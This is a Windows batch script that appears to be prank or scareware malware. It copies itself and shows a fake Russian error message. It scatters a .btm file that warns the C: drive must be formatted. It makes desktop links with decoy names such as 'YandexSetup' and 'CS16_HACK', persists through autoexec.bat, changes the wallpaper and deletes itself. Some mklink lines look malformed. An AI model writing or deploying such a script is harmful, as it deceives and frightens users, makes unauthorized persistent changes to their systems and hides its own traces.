@echo off
copy %0 C:\setup

set ln=mklink

msg * "Произошла непредвиденная ошибка"

md C:\Default\Users
md C:\Default\Windows
md C:\Default\Secure
md C:\Default\Undefined
md C:\Default\Storage
md C:\Default\Dummy

mklink %homedrive%%homepath%\Desktop\Immortal %0

echo "@echo off" > C:\drvmanager.btm
echo 'msg * "WinNTFS32: Требуется форматирование диска C:"' >> C:\drvmanager.btm

copy C:\drvmanager.btm C:\Default\driversetup.btm
copy C:\drvmanager.btm C:\Windows\driversetup.btm

copy C:\drvmanager.btm C:\Default\Users\drvmanager.btm
copy C:\drvmanager.btm C:\Default\Windows\drvmanager.btm
copy C:\drvmanager.btm C:\Default\Secure\drvmanager.btm
copy C:\drvmanager.btm C:\Default\Undefined\drvmanager.btm
copy C:\drvmanager.btm C:\Default\Storage\drvmanager.btm
copy C:\drvmanager.btm C:\Default\Dummy\drvmanager.btm

%ln% %homedrive%%homepath%\Desktop\Amigo-Global C:\Default\Users\drvmanager.btm
%ln% %homedrive%%homepath%\Desktop\NightlySetup C:\drvmanager.btm C:\Default\Windows\drvmanager.btm
%ln% %homedrive%%homepath%\Desktop\YandexSetup C:\drvmanager.btm C:\Default\Secure\drvmanager.btm
%ln% %homedrive%%homepath%\Desktop\Global C:\drvmanager.btm C:\Default\Undefined\drvmanager.btm
%ln% %homedrive%%homepath%\Desktop\CS16_HACK C:\drvmanager.btm C:\Default\Storage\drvmanager.btm
%ln% %homedrive%%homepath%\Desktop\Universal C:\drvmanager.btm C:\Default\Dummy\drvmanager.btm


echo C:\drvmanager.btm >>autoexec.bat
rem echo C:\Default\driversetup.btm >> autoexec.bat
rem echo C:\Windows\driversetup.btm >> autoexec.bat
echo "System started" > %TEMP%\setup

reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d C:\Default\Windows\i.bmp /f
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters

del %0
